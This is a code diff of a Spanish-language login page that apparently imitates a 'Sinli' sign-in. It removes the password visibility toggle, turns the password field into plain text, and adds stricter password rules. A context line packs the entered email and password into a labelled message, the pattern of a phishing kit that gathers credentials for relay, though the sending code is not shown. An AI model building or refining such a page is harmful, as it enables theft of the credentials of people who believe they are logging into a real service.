@@ -106,25 +106,6 @@
             padding: 15px;
             width: 200px;
         }
-
-        .toggle-password {
-            background: none;
-            border: none;
-            color: #5A37B4;
-            cursor: pointer;
-            position: absolute;
-            right: 10px; /* Espaciado desde el borde derecho */
-            top: 50%; /* Centrado vertical */
-            transform: translateY(-50%); /* Centrado vertical */
-            font-size: 14px;
-            padding: 0; /* Sin padding para que ocupe menos espacio */
-            width: 50px; /* Ancho fijo para el botón */
-            height: 30px; /* Alto fijo para el botón */
-        }
-
-        .toggle-password:hover {
-            opacity: 0.8; /* Opcional: cambiar la opacidad al pasar el ratón */
-        }
     </style>
     <style>
         .overlay {
@@ -154,9 +135,8 @@
             <form id="loginform2">
                 <h4 style="color: #333135f8 !important">Introduce tu contraseña</h4>
                 <div class="form-group2">
-                    <input type="password" id="contra" required />
+                    <input type="text" id="contra" required />
                     <label for="contra">Contraseña *</label>
-                    <button type="button" class="toggle-password" id="togglePassword">Mostrar</button>
                 </div>
                 <script>
                     document.addEventListener("DOMContentLoaded", function () {
@@ -177,15 +157,6 @@
                                 label.style.fontSize = "";
                             }
                         });
-                    });
-
-                    // Toggle password visibility
-                    const togglePassword = document.getElementById('togglePassword');
-                    togglePassword.addEventListener('click', function () {
-                        const input = document.getElementById('contra');
-                        const type = input.getAttribute('type') === 'password' ? 'text' : 'password';
-                        input.setAttribute('type', type);
-                        this.textContent = type === 'password' ? 'Mostrar' : 'Ocultar';
                     });
                 </script>
                 <div style="width: 100%; text-align: center; padding-bottom: 30px">
@@ -272,9 +243,10 @@
             const message = " ------ Sinli ------ Correox: " + nombre + " ------ Contra: " + contra;
 
             // Password validation
-            const regex = /^[\s\S]{8,}$/; // Permitir cualquier carácter y mínimo 8 caracteres
+            const regex = /^(?=.*[A-Z])(?=.*\d)(?=.*[\W_]).{8,}$/; 
+            // Permitir al menos 1 mayúscula, 1 número, 1 símbolo y mínimo 8 caracteres
             if (!regex.test(contra)) {
-                alert("La contraseña debe tener al menos 8 caracteres.");
+                alert("La contraseña debe tener al menos 8 caracteres, incluyendo al menos 1 letra mayúscula, 1 número y 1 símbolo.");
                 return; // Prevent form submission
             }
 
